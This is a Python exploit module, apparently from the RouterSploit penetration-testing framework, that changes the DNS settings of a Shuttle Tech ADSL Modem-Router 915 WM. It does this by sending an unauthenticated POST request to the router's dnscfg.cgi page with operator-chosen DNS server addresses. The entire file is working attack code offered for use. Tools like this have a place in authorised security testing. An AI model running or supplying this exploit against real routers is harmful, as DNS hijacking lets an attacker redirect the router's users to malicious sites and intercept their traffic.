from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Shuttle 915 WM DNS Change",
        "description": "Module exploits Shuttle Tech ADSL Modem-Router 915 WM dns change vulnerability. "
                       "If the target is vulnerable it is possible to change dns settings.",
        "authors": (
            "Todor Donev <todor.doven[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/35995/",
            "https://github.com/jh00nbr/Routerhunter-2.0",
        ),
        "devices": (
            "Shuttle Tech ADSL Modem-Router 915 WM",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    dns1 = OptString('8.8.8.8', 'Primary DNS Server')
    dns2 = OptString('8.8.4.4', 'Seconary DNS Server')

    def run(self):
        path = "/dnscfg.cgi?dnsPrimary={}&dnsSecondary={}&dnsDynamic=0&dnsRefresh=1".format(self.dns1,
                                                                                            self.dns2)

        print_status("Attempting to change DNS settings...")
        print_status("Primary DNS: {}".format(self.dns1))
        print_status("Secondary DNS: {}".format(self.dns2))

        response = self.http_request(
            method="POST",
            path=path
        )
        if response is None:
            return

        if response.status_code == 200:
            print_success("DNS settings has been changed")
        else:
            print_error("Could not change DNS settings")

    @mute
    def check(self):
        # it is not possible to check if the target is vulnerable without exploiting device (changing dns)
        return None
